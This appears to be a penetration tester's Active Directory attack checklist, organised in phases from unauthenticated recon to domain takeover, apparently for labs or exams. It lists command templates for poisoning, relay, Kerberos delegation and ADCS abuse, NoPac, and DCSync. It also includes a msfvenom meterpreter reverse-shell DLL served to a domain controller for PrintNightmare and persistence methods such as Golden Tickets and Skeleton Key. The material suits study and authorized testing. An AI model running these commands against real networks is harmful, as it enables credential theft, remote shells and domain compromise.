+++
title = 'Active Directory Checklist'
date = 2026-10-30
type = 'notes'
weight = 80
toc = true
task = true
tags = ['active-directory', 'checklist']
+++

> Working document — tick as you go. Commands are abbreviated; full detail is in the matching AD section of the notes.
> **Stop at the first domain compromise.** Configuration-based and credential-based paths (ACLs, delegation, ADCS) are faster and more reliable than CVE exploits. Known exploits (NoPac, PrintNightmare, PetitPotam) last.
> **CVE numbers are hints, not gospel** — verify the patch level against the current NVD before committing to a CVE-specific path.

**Target context — fill before starting:**

| Field | Value |
|---|---|
| Domain / forest | |
| DC(s) and IPs | |
| Current credential / hash | |
| Current access level (user / local admin / DA) | |
| ADCS present? (`certipy find`) | |
| Trusts present? | |
| EDR / Defender for Identity? | |
| MachineAccountQuota | |
| NTLM relay viable? (SMB/LDAP signing) | |
| Notes | |

---

## Phase 0 — Orient (60 seconds)

- [ ] Identify the DC(s) — `nltest /dclist:<domain>` / DNS SRV / `nmap -p 88,389,445,636`
- [ ] Add DC FQDN and IP to `/etc/hosts`
- [ ] Sync clock with the DC — `sudo ntpdate <DC-FQDN>` / `sudo rdate -n <DC-IP>`
- [ ] Record domain/forest level, DC hostname, and current credential context
- [ ] Confirm whether you are starting **unauthenticated** or **assumed breach** (with credentials)

---

## Phase 1 — Unauthenticated Recon (no credentials)

- [ ] SMB NULL / guest session: `netexec smb <DC> -u '' -p '' --shares`
- [ ] Anonymous LDAP RootDSE: `ldapsearch -x -H ldap://<DC> -s base -b "" "objectclass=*"`
- [ ] Common SMB credentials (blank, guest, admin/password)
- [ ] **Username enumeration** — `kerbrute userenum -d <domain> --dc <DC> users.txt`
- [ ] **AS-REP Roasting** — `impacket-GetNPUsers <domain>/ -dc-ip <DC> -usersfile users.txt -request`
- [ ] **Password policy** — `nxc smb <DC> -u '' -p '' --pass-pol`; watch for PSOs
- [ ] **Password spraying** — SpearSpray / `nxc` with **one password per pass**, respecting lockout
- [ ] **LLMNR/NBT-NS/mDNS poisoning** — `responder -I eth0 -dwPv`
- [ ] **mitm6** — IPv6 DHCPv6 takeover (`mitm6 -d <domain>`)
- [ ] **ADIDNS wildcard record** — `Authenticated Users` can register DNS by default
- [ ] Capture NetNTLM hashes → crack (`-m 5600`) or feed into relay

---

## Phase 2 — First Credential Acquisition

- [ ] AS-REP crack → valid user credential
- [ ] Password spray hit → valid credential
- [ ] LLMNR/NBT-NS capture → crack → credential
- [ ] SMB/LDAP/ADCS relay → machine or user credential / certificate
- [ ] Anonymous enumeration → credential in a share, GPP `cpassword`, description field
- [ ] **Verify the credential works against multiple services** — SMB, LDAP, WinRM, RDP
- [ ] Confirm the credential's domain vs local scope — `--local-auth` vs domain auth

> **Once you have one valid domain credential, stop unauthenticated work and proceed to Phase 3.**

---

## Phase 3 — Authenticated Enumeration (BloodHound)

- [ ] **BloodHound collection** — `bloodhound-python -u <user> -p '<pass>' -d <domain> -c All --zip`
- [ ] Start Neo4j + BloodHound, upload the ZIP
- [ ] Check **Shortest Path from Owned Principals to Domain Admins**
- [ ] Check **Find Principals with DCSync Rights**
- [ ] Check **Find Computers with Unconstrained Delegation**
- [ ] Check **Find Delegation** (constrained + RBCD)
- [ ] Check **`AddAllowedToAct`** edges — RBCD write access
- [ ] Check **`AllowedToDelegate`** edges — constrained delegation
- [ ] Check **`CoerceAndRelayNTLMToADCS`** and **`CoerceAndRelayNTLMToLDAPS`** edges
- [ ] Check **`SpoofSIDHistory`** edges — cross-forest
- [ ] Check **`GenericAll` / `GenericWrite` / `WriteDACL` / `WriteOwner` / `ForceChangePassword`** on high-value objects
- [ ] Enumerate **ADCS** — `certipy find -u <user> -p '<pass>' -dc-ip <DC> -vulnerable -stdout`
- [ ] Enumerate **trusts** — `Get-ADTrust -Filter *` / `nltest /domain_trusts /all_trusts /v`
- [ ] Enumerate **LAPS** — `Find-AdmPwdExtendedRights`, `Get-LAPSComputers`
- [ ] Enumerate **SYSVOL GPP** — `findstr /S /I cpassword \\<domain>\sysvol\...`
- [ ] Enumerate **shares** — `nxc smb <DC> -u <user> -p '<pass>' --shares`, `smbmap`
- [ ] Enumerate **logged-on users** — `nxc smb <subnet> --loggedon-users`
- [ ] Enumerate **domain users with SPN** — `impacket-GetUserSPNs <domain>/<user>:<pass> -request`

---

## Phase 4 — ACL Abuse (highest-value authenticated path)

Check each edge from Phase 3 against the abuse primitive:

- [ ] **ForceChangePassword** → reset target password (`Set-DomainUserPassword`)
- [ ] **GenericWrite (user)** → fake SPN → targeted Kerberoast (`Set-DomainObject -SET @{serviceprincipalname=...}`)
- [ ] **GenericWrite (group)** → add yourself (`Add-DomainGroupMember`)
- [ ] **GenericWrite (computer)** → RBCD (Phase 5) or read LAPS
- [ ] **GenericAll (user)** → password reset / fake SPN / **Shadow Credentials** (`pyWhisker` / `certipy shadow`)
- [ ] **GenericAll (group)** → add yourself (`Add-DomainGroupMember`)
- [ ] **GenericAll (computer)** → write `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD) or read LAPS
- [ ] **WriteDACL** → grant yourself `FullControl` / DCSync (`dacledit.py`, `bloodyAD add dacl`)
- [ ] **WriteOwner** → take ownership → write DACL (`Set-DomainObjectOwner`, `bloodyAD set owner`)
- [ ] **AllExtendedRights** → password reset or DCSync on the domain object
- [ ] **AddKeyCredentialLink** → Shadow Credentials → PKINIT TGT (`Whisker`, `pyWhisker`, `certipy shadow`)
- [ ] **ReadLAPSPassword / ReadGMSAPassword** → local admin / service auth
- [ ] **GPO write** → push scheduled task or local admin (`SharpGPOAbuse`, `pyGPOAbuse`)

---

## Phase 5 — Kerberos Delegation & RBCD

**Unconstrained delegation**

- [ ] Identify hosts with `TRUSTED_FOR_DELEGATION` (Phase 3)
- [ ] Compromise the host → `Rubeus.exe monitor /interval:5 /nowrap`
- [ ] Coerce a DC to authenticate (Phase 6)
- [ ] Capture `DC01$` TGT → `Rubeus.exe ptt` → `impacket-secretsdump -k -no-pass`

**Constrained delegation (S4U2Self / S4U2Proxy)**

- [ ] Identify accounts with `msDS-AllowedToDelegateTo` (Phase 3)
- [ ] Confirm protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`)
- [ ] `impacket-getST -spn cifs/<target> -impersonate administrator <domain>/<svc>:<pass>`
- [ ] Use `/altservice:http,host` to pivot to another service class if needed
- [ ] Authenticate: `export KRB5CCNAME=administrator.ccache; impacket-psexec -k -no-pass`

**RBCD (most common modern path)**

- [ ] Confirm `MachineAccountQuota > 0` (`nxc ldap -M maq`)
- [ ] Create machine account: `impacket-addcomputer ... -computer-name 'EVIL$' -computer-pass 'P@ss'`
- [ ] Write RBCD: `impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write`
- [ ] `impacket-getST -spn cifs/<target> -impersonate administrator <domain>/EVIL$:P@ss`
- [ ] Authenticate: `impacket-psexec -k -no-pass <target>`
- [ ] Clean up: `impacket-rbcd -action remove`

**Coercion → relay → RBCD (no admin prerequisite)**

- [ ] Identify LDAP signing / channel binding status
- [ ] `ntlmrelayx.py -t ldaps://<DC> --delegate-access --remove-mic`
- [ ] Coerce a DC: `PetitPotam.py <attacker-ip> <DC-IP>`
- [ ] Use the relayed machine account to set RBCD → getST → DA

---

## Phase 6 — Coercion & NTLM Relay

**Build the target list**

- [ ] `nxc smb <subnet> --gen-relay-list relay.txt` — hosts without SMB signing
- [ ] `nmap -p 389,636 --script ldap-rootdse <DC>` — LDAP signing / channel binding
- [ ] `curl -I http://<CA>/certsrv/` — ADCS Web Enrollment reachability

**Relay**

- [ ] Disable SMB/HTTP in `Responder.conf`
- [ ] Start Responder: `responder -I eth0 -dwPv`
- [ ] Start `ntlmrelayx`:
  - [ ] **SMB relay** — `ntlmrelayx.py -tf relay.txt -smb2support`
  - [ ] **LDAP relay** — `ntlmrelayx.py -t ldaps://<DC> --delegate-access --remove-mic`
  - [ ] **ADCS ESC8** — `ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController`
  - [ ] **MSSQL relay** — `ntlmrelayx.py -t mssql://<target>`
  - [ ] **SOCKS** — `ntlmrelayx.py -tf relay.txt -socks`

**Coercion — pick the vector that works**

- [ ] **PetitPotam** — authenticated on patched, unauthenticated on unpatched
- [ ] **PrinterBug** — requires Spooler running
- [ ] **DFSCoerce** — MS-DFSNM
- [ ] **ShadowCoerce** — MS-FSRVP
- [ ] **Coercer** — tries every vector automatically

**Use the result**

- [ ] SMB relay hit → SAM dump, user creation, or SMB shell
- [ ] LDAP relay hit → RBCD write (`--delegate-access`) or DCSync grant (`--escalate-user`)
- [ ] ADCS relay hit → DC certificate → `certipy auth -pfx dc01.pfx` → DCSync
- [ ] Machine-account coercion to ADCS → `certipy auth -pfx` → TGT + NT hash

---

## Phase 7 — ADCS (Certificate Services)

- [ ] `certipy find -u <user> -p '<pass>' -dc-ip <DC> -vulnerable -stdout`
- [ ] Check for **ESC1** — `ENROLLEE_SUPPLIES_SUBJECT` + client-auth EKU
- [ ] Check for **ESC2** — Any Purpose / no EKU
- [ ] Check for **ESC3** — Certificate Request Agent
- [ ] Check for **ESC4** — Writable template ACL (save-old → modify → restore)
- [ ] Check for **ESC6** — `EDITF_ATTRIBUTESUBJECTALTNAME2` on the CA
- [ ] Check for **ESC7** — `ManageCA` / Officer rights
- [ ] Check for **ESC8** — HTTP enrollment (Web Enrollment / ICPR) accepting NTLM
- [ ] Check for **ESC9 / ESC10** — `CT_FLAG_NO_SECURITY_EXTENSION` / weak mapping
- [ ] Check for **ESC11** — ICPR over RPC
- [ ] Check for **ESC13** — issuance policy linked to a group
- [ ] Check for **ESC15** — schema v1 template + app-policy injection (EKUwu)
- [ ] Check for **ESC16** — security extension disabled globally
- [ ] Check for **ESC17** — `ENROLLEE_SUPPLIES_SUBJECT` + **Server Auth** EKU (Certipy v5+)
- [ ] Check for **Certighost (CVE-2026-54121)** — CA fallback enrollment (check patch level)

**Exploitation**

- [ ] `certipy req ... -upn administrator@<domain>` (ESC1 / ESC6 / ESC17)
- [ ] `certipy req ... -on-behalf-of '<domain>\administrator'` (ESC3)
- [ ] `certipy template ... -write-default-configuration -save-old` (ESC4)
- [ ] `certipy req ... -application-policies 'Client Authentication'` (ESC15)
- [ ] `certipy auth -pfx administrator.pfx -dc-ip <DC>` → TGT + NT hash
- [ ] If PKINIT blocked: `certipy auth -pfx ... -ldap-shell` or `passthecert.py`

---

## Phase 8 — Known Exploits (when configuration paths are closed)

**NoPac (CVE-2021-42278 + CVE-2021-42287)**

- [ ] `nxc smb <DC> -u <user> -p '<pass>' -M nopac`
- [ ] Check `ms-DS-MachineAccountQuota > 0` — `nxc ldap -M maq`
- [ ] `python3 noPac.py <domain>/<user>:<pass> -dc-ip <DC> --impersonate administrator -shell`
- [ ] Dump: `python3 noPac.py ... --impersonate administrator -dump`

**PrintNightmare (CVE-2021-1675 / CVE-2021-34527)**

- [ ] `sc query spooler` — is the Spooler running?
- [ ] `rpcdump.py @<DC> | egrep 'MS-RPRN|MS-PAR'`
- [ ] Generate DLL: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... -f dll > backupscript.dll`
- [ ] Host the DLL: `smbserver.py -smb2support CompData /path/to/dll/`
- [ ] `python3 CVE-2021-1675.py <domain>/<user>:<pass>@<DC> '\\<attacker-ip>\CompData\backupscript.dll'`
- [ ] (Local variant) `Invoke-Nightmare` with `-NewUser` / `-NewPassword` or `-DLL`

**PetitPotam (CVE-2021-36942)**

- [ ] Unauthenticated on unpatched (`EfsRpcOpenFileRaw` over `\pipe\lsarpc`)
- [ ] Authenticated on patched (`EfsRpcDecryptFileSrv` over `\pipe\efsrpc`)
- [ ] `python3 PetitPotam.py <attacker-ip> <DC-IP>` (or `-u user -p pass`)
- [ ] Chain into relay: Phase 6

---

## Phase 9 — DCSync and Persistence

**Confirm DCSync rights**

- [ ] `Get-ObjectAcl "DC=<domain>,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -match 'Replication-Get' }`
- [ ] BloodHound **Find Principals with DCSync Rights**

**DCSync**

- [ ] `impacket-secretsdump -just-dc <domain>/<user>@<DC> -use-vss`
- [ ] `lsadump::dcsync /domain:<domain> /user:<domain>\administrator` (Mimikatz)
- [ ] Target **krbtgt** specifically: `secretsdump -just-dc-user krbtgt`

**Persistence — check the ROI before implementing**

- [ ] Golden Ticket (requires krbtgt hash) — forged TGT for any user
- [ ] **Diamond Ticket** — legit TGT base, modifies PAC (stealthier than Golden)
- [ ] Silver Ticket — forged TGS for a specific service
- [ ] Skeleton Key — Mimikatz on DC (`misc::skeleton`)
- [ ] AdminSDHolder — write on the SDProp template
- [ ] GoldenGMSA — extract gMSA blob and derive the password offline
- [ ] DCSync permissions — grant to a controlled account
- [ ] Shadow Credentials on a privileged object

---

## Phase 10 — Domain & Forest Trusts

- [ ] `Get-ADTrust -Filter * | select Name,Direction,ForestTransitive,SIDFilteringQuarantined`
- [ ] Check `SpoofSIDHistoryBlocked` — BloodHound `SpoofSIDHistory` edge
- [ ] **ExtraSids (intra-forest)** — `/sid:` = child, `/sids:` = forest-root EA SID
- [ ] **Cross-forest SID history** — only for non-builtin SIDs (Exchange Windows Permissions, MSOL_ accounts)
- [ ] **Trust key inter-realm TGT** — `lsadump::trust /patch` → forged inter-realm ticket
- [ ] **Cross-forest Kerberoast** — `GetUserSPNs <other-domain>/<user>:<pass> -dc-ip <other-dc>`
- [ ] **Cross-forest RBCD** — target domain's KDC must issue the ticket
- [ ] **FreeIPA trust** — check `ipa trust-find` for CVE-2026-11861 (PAC verification bypass)

---

## Stop Conditions

- [ ] Domain Admin obtained → **stop, record the exact path, screenshot / copy flags**
- [ ] Two full passes with no lead → re-read **BloodHound shortest paths**, **`certipy find -vulnerable`**, **delegation edges**, and **`AddAllowedToAct`** — these are the most-missed
- [ ] If time-boxed and stuck on the domain → **pivot to a member server or workstation**; a path to DA often runs through a one-hop machine
- [ ] If the DC is fully patched and hardened → look for **configuration paths** (RBCD, ADCS, delegation) rather than CVE exploits — they survive patch cycles

---

## Cross-Reference — Where Each Phase Lives in the Notes

| Phase | Note |
|---|---|
| Phase 1 — Unauthenticated | **Initial Access** |
| Phase 3 — Authenticated Enumeration | **Internal Enumeration & Lateral Movement** |
| Phase 4 — ACL Abuse | **Internal Enumeration & Lateral Movement → ACL Enumeration & Abuse** |
| Phase 5 — Delegation & RBCD | **Kerberos Delegation** |
| Phase 6 — Coercion & Relay | **NTLM Relay** |
| Phase 7 — ADCS | **ADCS Attacks** |
| Phase 8 — Known Exploits | **Privilege Escalation to DA using Known Exploits** |
| Phase 9 — DCSync & Persistence | **Internal Enumeration & Lateral Movement → DCSync** |
| Phase 10 — Trusts | **Domain Trusts** |


A few notes on the structure:

- **Phase 1 → Phase 2** separates *unauthenticated recon* from *credential acquisition* because most AD engagements start with no credentials, and the transition between the two is where you spend the most time.
- **Phase 4 (ACL Abuse)** is deliberately early because it is often a two-hop path to Domain Admin — far faster than coercion or ADCS. If BloodHound shows a `GenericAll` or `WriteDACL` edge, you may never need to touch Phases 5–8.
- **Phase 6 (Coercion & Relay)** sits before ADCS because it feeds ADCS — the highest-value coercion output is a certificate, not a shell.
- **Phase 7 (ADCS)** is its own phase because Certipy’s `find -vulnerable` output is the single densest source of escalation paths in modern AD.
- **Phase 8 (Known Exploits)** is last because NoPac, PrintNightmare, and PetitPotam are usually closed on a patched 2026 domain — their primitives now flow through Phase 5 and Phase 7.
- **Phase 10 (Trusts)** is the last because it is the highest-complexity phase and the least likely to be needed for a single-domain engagement.
